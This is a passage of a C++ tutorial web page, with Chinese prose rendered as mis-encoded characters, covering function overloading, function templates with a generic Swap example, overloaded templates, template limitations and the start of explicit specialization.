ä½•æ—¶ä½¿ç”¨å‡½æ•°é‡è½½</h3><p>å‡½æ•°é‡è½½æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œä½†åº”è°¨æ…ä½¿ç”¨ï¼Œä»¥ä¿æŒä»£ç çš„æ¸…æ™°æ€§ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›é€‚åˆä½¿ç”¨å‡½æ•°é‡è½½çš„æƒ…å†µï¼š</p><ol><li> <strong>æ‰§è¡Œæ¦‚å¿µä¸Šç›¸ä¼¼çš„ä»»åŠ¡:</strong> å½“å¤šä¸ªå‡½æ•°æ‰§è¡Œçš„æ“ä½œé€»è¾‘ä¸Šç›¸ä¼¼ï¼Œåªæ˜¯å¤„ç†çš„æ•°æ®ç±»å‹ä¸åŒæ—¶ï¼ˆå¦‚ä¸Šä¾‹ä¸­çš„ <code>print</code> å‡½æ•°ï¼Œæˆ–è®¡ç®—ä¸åŒç±»å‹æ•°å€¼ç»å¯¹å€¼çš„ <code>abs</code> å‡½æ•°ï¼‰ã€‚</li><li> <strong>æä¾›ä¸åŒå‚æ•°ç»„åˆ:</strong> å½“ä¸€ä¸ªä»»åŠ¡å¯ä»¥é€šè¿‡æä¾›ä¸åŒæ•°é‡æˆ–ç±»å‹çš„å‚æ•°æ¥å®Œæˆæ—¶ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæ„é€ å‡½æ•°å¯ä»¥æ¥å—ä¸åŒçš„åˆå§‹åŒ–å‚æ•°ç»„åˆï¼‰ã€‚</li></ol><p><strong>é¿å…ä½¿ç”¨å‡½æ•°é‡è½½çš„æƒ…å†µ:</strong></p><ol><li> <strong>æ‰§è¡Œå®Œå…¨ä¸åŒçš„ä»»åŠ¡:</strong> å¦‚æœå‡½æ•°è™½ç„¶åç§°ç›¸åŒï¼Œä½†æ‰§è¡Œçš„ä»»åŠ¡åœ¨é€»è¾‘ä¸Šæ¯«ä¸ç›¸å…³ï¼Œé‚£ä¹ˆé‡è½½å¯èƒ½ä¼šå¯¼è‡´æ··æ·†ã€‚æ­¤æ—¶åº”ä½¿ç”¨ä¸åŒçš„å‡½æ•°åã€‚</li><li> <strong>ä»…å‚æ•°ç±»å‹å¯é€šè¿‡é»˜è®¤å‚æ•°æˆ–æ¨¡æ¿å®ç°:</strong> å¦‚æœå‡½æ•°çš„åŠŸèƒ½å·®å¼‚å¯ä»¥é€šè¿‡é»˜è®¤å‚æ•°æˆ–å‡½æ•°æ¨¡æ¿ï¼ˆè§ 8.5 èŠ‚ï¼‰æ›´æ¸…æ™°åœ°è¡¨è¾¾ï¼Œé‚£ä¹ˆå¯èƒ½ä¸éœ€è¦é‡è½½ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåªæ˜¯å‚æ•°æ•°é‡ä¸åŒï¼Œä¸”è¾ƒå°‘å‚æ•°çš„ç‰ˆæœ¬å¯ä»¥é€šè¿‡ä¸ºè¾ƒå¤šå‚æ•°ç‰ˆæœ¬æä¾›é»˜è®¤å€¼æ¥å®ç°ï¼Œé‚£ä¹ˆé»˜è®¤å‚æ•°å¯èƒ½æ›´åˆé€‚ã€‚</li></ol><p><strong>æ€»ç»“:</strong></p><p>å‡½æ•°é‡è½½å…è®¸æˆ‘ä»¬ç”¨åŒä¸€ä¸ªåç§°å®šä¹‰å¤šä¸ªåŠŸèƒ½ç›¸ä¼¼ä½†å‚æ•°åˆ—è¡¨ä¸åŒçš„å‡½æ•°ã€‚ç¼–è¯‘å™¨æ ¹æ®è°ƒç”¨æ—¶æä¾›çš„å®å‚æ¥é€‰æ‹©æ­£ç¡®çš„ç‰ˆæœ¬ã€‚è¿™æ˜¯ C++ å®ç°å¤šæ€æ€§çš„ä¸€ç§æ–¹å¼ï¼ˆç¼–è¯‘æ—¶å¤šæ€ï¼‰ï¼Œå¯ä»¥ä½¿ä»£ç æ›´ç›´è§‚ã€æ›´æ˜“ç”¨ï¼Œä½†åº”ç¡®ä¿é‡è½½çš„å‡½æ•°åœ¨é€»è¾‘ä¸Šæ˜¯ç›¸å…³çš„ï¼Œä»¥é¿å…æ··æ·†ã€‚</p><h2 id="8-5-å‡½æ•°æ¨¡æ¿"><a href="#8-5-å‡½æ•°æ¨¡æ¿" class="headerlink" title="8.5 å‡½æ•°æ¨¡æ¿"></a>8.5 å‡½æ•°æ¨¡æ¿</h2><p>å‡½æ•°é‡è½½å…è®¸æˆ‘ä»¬ä¸ºä¸åŒçš„å‚æ•°ç±»å‹å®šä¹‰åŒåå‡½æ•°ï¼Œä½†å¦‚æœè¿™äº›å‡½æ•°çš„é€»è¾‘å®Œå…¨ç›¸åŒï¼Œåªæ˜¯å¤„ç†çš„æ•°æ®ç±»å‹ä¸åŒï¼Œä¸ºæ¯ç§ç±»å‹éƒ½å†™ä¸€ä¸ªé‡è½½ç‰ˆæœ¬ä¼šå¾ˆç¹çä¸”å®¹æ˜“å‡ºé”™ã€‚ä¾‹å¦‚ï¼Œäº¤æ¢ä¸¤ä¸ª <code>int</code> å’Œäº¤æ¢ä¸¤ä¸ª <code>double</code> çš„é€»è¾‘æ˜¯ä¸€æ ·çš„ã€‚</p><p><strong>å‡½æ•°æ¨¡æ¿ (Function Template)</strong> æä¾›äº†ä¸€ç§æ›´é€šç”¨çš„è§£å†³æ–¹æ¡ˆã€‚å®ƒå…è®¸æˆ‘ä»¬ç¼–å†™ä¸€ä¸ª<strong>ä¸ç±»å‹æ— å…³</strong>çš„å‡½æ•°å®šä¹‰ï¼Œå…¶ä¸­çš„æ•°æ®ç±»å‹ä½¿ç”¨<strong>æ¨¡æ¿å‚æ•°</strong>ï¼ˆä¹Ÿå«ç±»å‹å‚æ•°ï¼‰æ¥è¡¨ç¤ºã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®å‡½æ•°è°ƒç”¨æ—¶ä½¿ç”¨çš„å…·ä½“æ•°æ®ç±»å‹ï¼Œè‡ªåŠ¨ç”Ÿæˆï¼ˆå®ä¾‹åŒ–ï¼‰ç›¸åº”çš„å‡½æ•°ç‰ˆæœ¬ã€‚</p><p><strong>ç›®çš„:</strong></p><ul><li>  ç¼–å†™é€šç”¨çš„ã€å¯é‡ç”¨çš„ä»£ç ï¼Œé€‚ç”¨äºå¤šç§æ•°æ®ç±»å‹ã€‚</li><li>  å‡å°‘ä»£ç é‡å¤ã€‚</li><li>  æé«˜ä»£ç çš„å¯ç»´æŠ¤æ€§ã€‚</li></ul><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// æˆ–è€… template &lt;class T&gt;</span></span><br><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(parameter_list)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å‡½æ•°ä½“ï¼Œå¯ä»¥ä½¿ç”¨ç±»å‹å‚æ•° T</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;typename T&gt;</code>: è¿™æ˜¯æ¨¡æ¿å£°æ˜ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªæ¨¡æ¿å®šä¹‰ã€‚<code>typename</code> æ˜¯å…³é”®å­—ï¼ˆä¹Ÿå¯ä»¥ç”¨ <code>class</code> å…³é”®å­—ä»£æ›¿ï¼Œä¸¤è€…åœ¨è¿™é‡Œç­‰ä»·ï¼‰ï¼Œ<code>T</code> æ˜¯æ¨¡æ¿å‚æ•°çš„åç§°ï¼ˆé€šå¸¸ç”¨å¤§å†™å­—æ¯ï¼Œå¦‚ <code>T</code>, <code>U</code>, <code>V</code>ï¼Œä½†å¯ä»¥æ˜¯ä»»ä½•åˆæ³•æ ‡è¯†ç¬¦ï¼‰ã€‚ä½ å¯ä»¥å®šä¹‰å¤šä¸ªæ¨¡æ¿å‚æ•°ï¼Œç”¨é€—å·åˆ†éš”ï¼Œä¾‹å¦‚ <code>template &lt;typename T, typename U&gt;</code>ã€‚</li><li>  <code>return_type</code>, <code>parameter_list</code>, <code>function_name</code>: ä¸æ™®é€šå‡½æ•°å®šä¹‰ç±»ä¼¼ï¼Œä½†å¯ä»¥åœ¨è¿™äº›éƒ¨åˆ†ä½¿ç”¨æ¨¡æ¿å‚æ•° <code>T</code> æ¥ä»£è¡¨æŸç§å¾…å®šçš„æ•°æ®ç±»å‹ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼šé€šç”¨çš„äº¤æ¢å‡½æ•°æ¨¡æ¿</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªå‡½æ•°æ¨¡æ¿ Swap</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// T ä»£è¡¨ä»»æ„ç±»å‹</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123; <span class="comment">// å‚æ•°æ˜¯ç±»å‹ T çš„å¼•ç”¨</span></span><br><span class="line">    T temp; <span class="comment">// å£°æ˜ä¸€ä¸ªç±»å‹ä¸º T çš„ä¸´æ—¶å˜é‡</span></span><br><span class="line">    temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original ints: i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    Swap(i, j); <span class="comment">// ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆ Swap&lt;int&gt;(int&amp;, int&amp;) ç‰ˆæœ¬</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Swapped ints: i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> x = <span class="number">1.5</span>, y = <span class="number">2.8</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nOriginal doubles: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    Swap(x, y); <span class="comment">// ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆ Swap&lt;double&gt;(double&amp;, double&amp;) ç‰ˆæœ¬</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Swapped doubles: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> c1 = <span class="string">&#x27;A&#x27;</span>, c2 = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nOriginal chars: c1 = &quot;</span> &lt;&lt; c1 &lt;&lt; <span class="string">&quot;, c2 = &quot;</span> &lt;&lt; c2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    Swap(c1, c2); <span class="comment">// ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆ Swap&lt;char&gt;(char&amp;, char&amp;) ç‰ˆæœ¬</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Swapped chars: c1 = &quot;</span> &lt;&lt; c1 &lt;&lt; <span class="string">&quot;, c2 = &quot;</span> &lt;&lt; c2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Swap(i, x); // é”™è¯¯ï¼ç¼–è¯‘å™¨æ— æ³•æ¨æ–­å‡ºå”¯ä¸€çš„ T ç±»å‹ (int vs double)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>Swap</code> çš„å‡½æ•°æ¨¡æ¿ï¼Œå®ƒä½¿ç”¨ç±»å‹å‚æ•° <code>T</code>ã€‚</li><li> åœ¨ <code>main</code> å‡½æ•°ä¸­ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ <code>Swap(i, j)</code> æ—¶ï¼Œç¼–è¯‘å™¨çœ‹åˆ°ä¸¤ä¸ªå®å‚éƒ½æ˜¯ <code>int</code> ç±»å‹ï¼Œäºæ˜¯å®ƒæ¨æ–­å‡º <code>T</code> åº”è¯¥æ˜¯ <code>int</code>ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆï¼ˆå®ä¾‹åŒ–ï¼‰ä¸€ä¸ªä¸“é—¨å¤„ç† <code>int</code> çš„ <code>Swap</code> å‡½æ•°ç‰ˆæœ¬ï¼š<code>void Swap&lt;int&gt;(int&amp; a, int&amp; b)</code>ã€‚</li><li> ç±»ä¼¼åœ°ï¼Œè°ƒç”¨ <code>Swap(x, y)</code> æ—¶ï¼Œç¼–è¯‘å™¨ç”Ÿæˆ <code>Swap&lt;double&gt;</code> ç‰ˆæœ¬ï¼›è°ƒç”¨ <code>Swap(c1, c2)</code> æ—¶ï¼Œç”Ÿæˆ <code>Swap&lt;char&gt;</code> ç‰ˆæœ¬ã€‚</li><li> è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º**æ¨¡æ¿å®ä¾‹åŒ– (Template Instantiation)**ã€‚ç¼–è¯‘å™¨åªä¸ºç¨‹åºä¸­å®é™…ç”¨åˆ°çš„ç±»å‹ç”Ÿæˆå‡½æ•°å®ä¾‹ã€‚</li></ol><h3 id="8-5-1-é‡è½½çš„æ¨¡æ¿"><a href="#8-5-1-é‡è½½çš„æ¨¡æ¿" class="headerlink" title="8.5.1 é‡è½½çš„æ¨¡æ¿"></a>8.5.1 é‡è½½çš„æ¨¡æ¿</h3><p>å‡½æ•°æ¨¡æ¿ä¹Ÿå¯ä»¥åƒæ™®é€šå‡½æ•°ä¸€æ ·è¢«<strong>é‡è½½</strong>ã€‚ä½ å¯ä»¥æä¾›å¤šä¸ªåŒåçš„å‡½æ•°æ¨¡æ¿ï¼Œåªè¦å®ƒä»¬çš„æ¨¡æ¿å‚æ•°åˆ—è¡¨ä¸åŒï¼Œæˆ–è€…å‡½æ•°å‚æ•°åˆ—è¡¨ï¼ˆéæ¨¡æ¿å‚æ•°éƒ¨åˆ†ï¼‰ä¸åŒå³å¯ã€‚</p><p><strong>ç¤ºä¾‹ï¼šé‡è½½æ¨¡æ¿ä»¥å¤„ç†ä¸åŒæ•°é‡çš„å‚æ•°æˆ–ç‰¹å®šç±»å‹</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¨¡æ¿ç‰ˆæœ¬ 1: äº¤æ¢ä¸¤ä¸ªåŒç±»å‹å˜é‡</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using Swap(T&amp;, T&amp;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    T temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¨¡æ¿ç‰ˆæœ¬ 2: äº¤æ¢ä¸¤ä¸ªæ•°ç»„çš„å…ƒç´  (éœ€è¦é¢å¤–å‚æ•°æŒ‡å®šå¤§å°)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T arr1[], T arr2[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using Swap(T[], T[], int)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        T temp = arr1[i];</span><br><span class="line">        arr1[i] = arr2[i];</span><br><span class="line">        arr2[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">20</span>;</span><br><span class="line">    Swap(i, j); <span class="comment">// è°ƒç”¨ç‰ˆæœ¬ 1: Swap&lt;int&gt;(int&amp;, int&amp;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> arr_a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> arr_b[] = &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nBefore swapping arrays:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_a: &quot;</span> &lt;&lt; arr_a[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_b: &quot;</span> &lt;&lt; arr_b[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    Swap(arr_a, arr_b, size); <span class="comment">// è°ƒç”¨ç‰ˆæœ¬ 2: Swap&lt;int&gt;(int[], int[], int)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAfter swapping arrays:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_a: &quot;</span> &lt;&lt; arr_a[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_b: &quot;</span> &lt;&lt; arr_b[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨ä¼šæ ¹æ®è°ƒç”¨æ—¶æä¾›çš„å‚æ•°æ•°é‡å’Œç±»å‹ï¼ˆåŒ…æ‹¬æ˜¯å¦æ˜¯æ•°ç»„ï¼‰æ¥é€‰æ‹©æœ€åŒ¹é…çš„é‡è½½æ¨¡æ¿ã€‚</p><h3 id="8-5-2-æ¨¡æ¿çš„å±€é™æ€§"><a href="#8-5-2-æ¨¡æ¿çš„å±€é™æ€§" class="headerlink" title="8.5.2 æ¨¡æ¿çš„å±€é™æ€§"></a>8.5.2 æ¨¡æ¿çš„å±€é™æ€§</h3><p>å‡½æ•°æ¨¡æ¿æ˜¯é€šç”¨çš„ï¼Œä½†å¹¶éä¸‡èƒ½ã€‚æ¨¡æ¿ä»£ç ä¸­ä½¿ç”¨çš„æ“ä½œï¼ˆå¦‚èµ‹å€¼ <code>=</code>ã€æ¯”è¾ƒ <code>&lt;</code>ã€<code>&gt;</code> ç­‰ï¼‰å¿…é¡»å¯¹å®ä¾‹åŒ–æ—¶ä½¿ç”¨çš„å…·ä½“ç±»å‹æœ‰æ•ˆã€‚å¦‚æœæŸä¸ªç±»å‹ä¸æ”¯æŒæ¨¡æ¿ä»£ç ä¸­çš„æ“ä½œï¼Œé‚£ä¹ˆå®ä¾‹åŒ–è¯¥ç±»å‹çš„æ¨¡æ¿å°±ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæ¨¡æ¿å¯èƒ½å¤±è´¥çš„æƒ…å†µ</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CompareAndPrint</span><span class="params">(<span class="keyword">const</span> T&amp; a, <span class="keyword">const</span> T&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a &lt; b) &#123; <span class="comment">// å‡è®¾ç±»å‹ T æ”¯æŒ &lt; è¿ç®—ç¬¦</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a is less than b&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &lt; a) &#123; <span class="comment">// å‡è®¾ç±»å‹ T æ”¯æŒ &lt; è¿ç®—ç¬¦</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b is less than a&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a and b are equal (or incomparable)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="comment">// è¿™ä¸ªç»“æ„ä½“æ²¡æœ‰é‡è½½ &lt; è¿ç®—ç¬¦</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    CompareAndPrint(x, y); <span class="comment">// OK: int æ”¯æŒ &lt; è¿ç®—ç¬¦</span></span><br><span class="line"></span><br><span class="line">    Data d1 = &#123;<span class="number">10</span>&#125;;</span><br><span class="line">    Data d2 = &#123;<span class="number">20</span>&#125;;</span><br><span class="line">    <span class="comment">// CompareAndPrint(d1, d2); // ç¼–è¯‘é”™è¯¯ï¼Data ç±»å‹æ²¡æœ‰å®šä¹‰ operator&lt;</span></span><br><span class="line">                               <span class="comment">// ç¼–è¯‘å™¨æ— æ³•å®ä¾‹åŒ– CompareAndPrint&lt;Data&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ä¸º <code>Data</code> ç»“æ„é‡è½½ <code>&lt;</code> è¿ç®—ç¬¦ï¼Œæˆ–è€…ä½¿ç”¨ä¸‹ä¸€èŠ‚å°†ä»‹ç»çš„<strong>æ˜¾å¼å…·ä½“åŒ–</strong>ã€‚</p><h3 id="8-5-3-æ˜¾å¼å…·ä½“åŒ–-Explicit-Specialization"><a href="#8-5-3-æ˜¾å¼å…·ä½“åŒ–-Explicit-Specialization" class="headerlink" title="8.5.3 æ˜¾å¼å…·ä½“åŒ– (Explicit Specialization)"></a>8.5.3 æ˜¾å¼å…·ä½“åŒ– (Explicit Specialization)</h3><p>æœ‰æ—¶ï¼Œé€šç”¨çš„å‡½æ•°æ¨¡æ¿å¯¹äºæŸä¸ªç‰¹å®šç±»å‹å¯èƒ½ä¸é€‚ç”¨æˆ–æ•ˆç‡ä¸é«˜ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸ºè¿™ä¸ªç‰¹å®šç±»å‹æä¾›ä¸€ä¸ªä¸“é—¨çš„ã€éæ¨¡æ¿çš„å®ç°ã€‚è¿™å°±æ˜¯<strong>æ˜¾å¼å…·ä½“åŒ–</strong>ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;&gt; <span class="comment">// ç©ºçš„å°–æ‹¬å·è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå…·ä½“åŒ–</span></span><br><span class="line">return_type function_name&lt;specific_type&gt;(parameter_list_with_specific_type) &#123;</span><br><span class="line">    <span class="comment">// 